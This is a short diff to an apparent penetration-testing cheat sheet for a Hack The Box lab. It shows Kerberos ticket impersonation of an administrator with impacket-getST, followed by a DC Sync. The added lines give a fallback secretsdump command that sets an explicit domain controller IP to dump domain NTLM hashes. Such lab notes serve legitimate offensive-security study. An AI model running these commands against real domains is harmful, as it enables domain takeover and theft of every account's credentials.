@@ -2278,6 +2278,8 @@ impacket-getST -spn 'cifs/dc.support.htb' -impersonate 'administrator' 'support.
 export KRB5CCNAME=administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache 
 **# DC Sync with the Ticket :** 
 impacket-secretsdump -k -no-pass -just-dc-ntlm support.htb/administrator@$target
+# If fails specify the dc-ip :
+secretsdump.py -k -no-pass -just-dc-ntlm -dc-ip 172.16.2.6 DEV.ADMIN/administrator@DC02.DEV.ADMIN
 
 # Syntax for Hashes + Machine acc :
 
